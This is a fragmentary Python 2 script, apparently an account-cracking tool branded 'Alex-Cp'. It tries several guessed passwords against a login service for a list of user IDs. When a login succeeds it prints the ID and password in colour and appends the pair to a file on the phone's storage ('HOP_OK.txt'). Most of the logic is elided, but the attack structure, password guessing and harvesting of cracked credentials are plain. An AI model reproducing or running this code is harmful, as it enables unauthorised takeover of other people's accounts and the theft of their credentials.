...
def a_s():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;91m[Alex-Cp] \x1b[1;31m' + uid + ' | ' + pass1 + '\x1b[0;91m'
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;91m[Alex-Cp] \x1b[1;31m' + uid + ' | ' + pass2 + '\x1b[0;91m'
                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;91m[Alex-Cp] \x1b[1;31m' + uid + ' | ' + pass3 + '\x1b[0;91m'
                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
...
def c_s():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;96m[Alex-Cp] \x1b[1;36m' + uid + ' | ' + pass1 + '\x1b[0;96m'
                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;96m[Alex-Cp] \x1b[1;36m' + uid + ' | ' + pass2 + '\x1b[0;96m'
                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;96m[Alex-Cp] \x1b[1;36m' + uid + ' | ' + pass3 + '\x1b[0;96m'
                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
